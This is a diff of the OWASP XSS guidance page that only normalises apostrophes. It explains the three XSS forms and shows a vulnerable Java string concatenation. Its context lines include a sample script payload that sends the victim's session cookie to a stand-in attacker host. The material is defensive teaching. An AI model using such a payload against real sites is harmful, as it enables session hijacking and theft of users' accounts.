@@ -9,7 +9,7 @@
 
 There are three forms of XSS, usually targeting users' browsers:
 
-* **Reflected XSS**: Your app or API includes unvalidated and  unescaped user input as part of HTML output or there is no content security policy ([CSP](https://www.owasp.org/index.php/Content_Security_Policy)) header. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with a link, or some other attacker controlled page, such as a watering hole attack, malicious advertisements, or similar.
+* **Reflected XSS**: Your app or API includes unvalidated and  unescaped user input as part of HTML output or there is no content security policy ([CSP](https://www.owasp.org/index.php/Content_Security_Policy)) header. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim's browser. Typically the user will need to interact with a link, or some other attacker controlled page, such as a watering hole attack, malicious advertisements, or similar.
 * **Stored XSS**: Your app or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
 * **DOM XSS**: JavaScript frameworks, single page apps, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs.
 
@@ -32,13 +32,13 @@ Preventing XSS requires separation of untrusted data from active browser content
    (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
 ```
 
-The attacker modifies the 'CC’ parameter in the browser to:
+The attacker modifies the 'CC' parameter in the browser to:
 
 ```
 ><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
 ```
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session.
 
 Note that attackers can use XSS to defeat any automated CSRF defense the application might employ. 
 
